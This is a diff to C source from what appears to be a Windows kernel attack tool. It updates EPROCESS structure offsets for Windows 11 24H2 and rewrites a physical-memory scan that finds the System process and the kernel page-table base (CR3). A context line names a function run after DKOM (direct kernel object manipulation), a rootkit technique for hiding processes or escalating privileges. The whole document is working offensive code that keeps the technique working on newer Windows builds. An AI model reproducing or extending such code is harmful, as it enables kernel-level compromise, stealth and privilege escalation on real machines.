@@ -437,9 +437,9 @@ static void eproc_map_update_after_dkom(uint64_t prev_flink_pa, uint64_t next_bl
 
 /* ── Static layout table — used ONLY as bootstrap for physical scan ─── */
 static const EP_OFFSETS g_scan_layouts[] = {
-    { 0x440, 0x448, 0x5A8, 0x87A }, /* Win10 1903+ / Win11 21H2–23H2       */
-    { 0x440, 0x448, 0x5B8, 0x87A }, /* Win11 24H2+ (build 26100+)           */
-    { 0x440, 0x448, 0x5B0, 0x87A }, /* Win11 24H2 variant                   */
+    { 0x1D0, 0x1D8, 0x338, 0x5FA }, /* Win11 24H2+ (build 26100+)           */
+    { 0x440, 0x448, 0x5A8, 0x87A }, /* Win10 1903+ / Win11 21H2–23H2        */
+    { 0x440, 0x448, 0x5B8, 0x87A }, /* Win10/Win11 pre-24H2 variant         */
     { 0x2E8, 0x2F0, 0x450, 0x6FA }, /* Win10 1809                           */
     { 0x2E0, 0x2E8, 0x448, 0x6F2 }, /* Win10 1507–1803                      */
 };
@@ -912,12 +912,19 @@ static uint64_t eproc_via_phys_scan(DWORD target_pid, const char *target_name) {
  */
 static uint64_t find_system_eproc_pa(void) {
     static uint8_t page[0x1000];
-    /* Need: PID(+0x440+8), Blink(+0x450+8) all in page → sub_max = 0x1000-0x458 */
-    const int sub_max = 0x1000 - 0x458;
 
-    printf("  [*] Finding System EPROCESS (PID-first scan, layout-agnostic)...\n");
+    /* Dual-layout probe: Win11 24H2+ uses pid@0x1D0/flink@0x1D8, Win10 uses 0x440/0x448 */
+    static const struct { uint32_t p, fl; } plyt[] = {
+        { 0x1D0, 0x1D8 }, /* Win11 24H2+ (build 26100+) */
+        { 0x440, 0x448 }, /* Win10 / Win11 pre-24H2     */
+    };
+    /* ImageFileName candidates — 0x338 first for Win11 24H2+ */
+    static const uint32_t name_cands[] = {
+        0x338, 0x5A8, 0x5B8, 0x5B0, 0x5C0, 0x5A0, 0x5C8
+    };
 
-    /* System EPROCESS is always allocated early; search first 512MB */
+    printf("  [*] Finding System EPROCESS (dual-layout scan)...\n");
+
     for (int ri = 0; ri < g_nranges; ri++) {
         uint64_t rbase = g_ranges[ri].base;
         uint64_t rend  = g_ranges[ri].base + g_ranges[ri].size;
@@ -927,55 +934,56 @@ static uint64_t find_system_eproc_pa(void) {
         for (uint64_t page_pa = rbase; page_pa < scan_end; page_pa += 0x1000) {
             if (!phys_read(page_pa, page, 0x1000)) continue;
 
+            /* sub_max covers Win11 24H2+ layout (blink@+0x1E0, need +8 = 0x1E8) */
+            const int sub_max = (int)(0x1000 - 0x1E8);
             for (int sub = 0; sub <= sub_max; sub += 0x10) {
-                /* 1. PID = 4 (QWORD at +0x440; upper 32 bits must be 0) */
-                uint64_t pid;
-                memcpy(&pid, page + sub + 0x440, 8);
-                if (pid != 4) continue;
+                for (int li = 0; li < 2; li++) {
+                    uint32_t p_off  = plyt[li].p;
+                    uint32_t fl_off = plyt[li].fl;
+                    uint32_t bl_off = fl_off + 8;
+                    if ((uint32_t)sub + bl_off + 8 > 0x1000) continue;
 
-                /* 2. DTB: page-aligned, realistic, must be a physical address
-                 * (not a kernel VA — e.g. 0xFFFFFFFE00000000 passes page-align
-                 *  check but is clearly a VA, not a CR3). Bit 40+ must be zero. */
-                uint64_t dtb;
-                memcpy(&dtb, page + sub + 0x028, 8);
-                if (!dtb || (dtb & 0xFFF) || dtb < 0x10000 || (dtb >> 40)) continue;
+                    uint64_t pid;
+                    memcpy(&pid, page + sub + p_off, 8);
+                    if (pid != 4) continue;
 
-                /* 3 & 4. Flink/Blink: canonical kernel VAs */
-                uint64_t flink, blink;
-                memcpy(&flink, page + sub + 0x448, 8);
-                memcpy(&blink, page + sub + 0x450, 8);
-                if ((flink >> 48) != 0xFFFF) continue;
-                if ((blink >> 48) != 0xFFFF) continue;
+                    /* DTB must be page-aligned physical address (bit 40+ = 0) */
+                    uint64_t dtb;
+                    memcpy(&dtb, page + sub + 0x028, 8);
+                    if (!dtb || (dtb & 0xFFF) || dtb < 0x10000 || (dtb >> 40)) continue;
 
-                uint64_t eproc_pa = page_pa + (uint64_t)sub;
+                    uint64_t flink, blink;
+                    memcpy(&flink, page + sub + fl_off, 8);
+                    memcpy(&blink, page + sub + bl_off, 8);
+                    if ((flink >> 48) != 0xFFFF) continue;
+                    if ((blink >> 48) != 0xFFFF) continue;
 
-                /* Determine ImageFileName offset — check all candidates */
-                static const uint32_t name_cands[] = {
-                    0x5A8, 0x5B8, 0x5B0, 0x5C0, 0x5A0, 0x5C8
-                };
-                int layout_found = -1;
-                for (int ni = 0; ni < 6; ni++) {
-                    uint8_t nb[8] = {0};
-                    if (!phys_read(eproc_pa + name_cands[ni], nb, 7)) continue;
-                    if (memcmp(nb, "System", 6) != 0) continue;
-                    /* Confirm layout index in g_scan_layouts */
-                    for (int li = 0; li < (int)N_LAYOUTS; li++) {
-                        if (g_scan_layouts[li].ImageFileName == name_cands[ni]) {
-                            layout_found = li;
-                            break;
+                    uint64_t eproc_pa = page_pa + (uint64_t)sub;
+
+                    /* Match ImageFileName offset → g_scan_layouts index */
+                    int layout_found = -1;
+                    for (int ni = 0; ni < 7; ni++) {
+                        uint8_t nb[8] = {0};
+                        if (!phys_read(eproc_pa + name_cands[ni], nb, 7)) continue;
+                        if (memcmp(nb, "System", 6) != 0) continue;
+                        for (int lii = 0; lii < (int)N_LAYOUTS; lii++) {
+                            if (g_scan_layouts[lii].ImageFileName == name_cands[ni] &&
+                                g_scan_layouts[lii].UniqueProcessId == p_off) {
+                                layout_found = lii; break;
+                            }
                         }
+                        if (layout_found < 0) layout_found = li; /* best guess */
+                        break;
                     }
-                    if (layout_found < 0) layout_found = 0; /* fallback to layout 0 */
-                    break;
+
+                    printf("  [+] System EPROCESS PA=0x%016" PRIX64
+                           "  DTB=0x%016" PRIX64 "  layout=%d\n",
+                           eproc_pa, dtb, layout_found);
+
+                    g_kernel_cr3 = dtb;
+                    if (layout_found >= 0) g_layout = layout_found;
+                    return eproc_pa;
                 }
-
-                printf("  [+] System EPROCESS PA=0x%016" PRIX64
-                       "  DTB=0x%016" PRIX64 "  layout=%d\n",
-                       eproc_pa, dtb, layout_found);
-
-                g_kernel_cr3 = dtb;
-                if (layout_found >= 0) g_layout = layout_found;
-                return eproc_pa;
             }
         }
     }
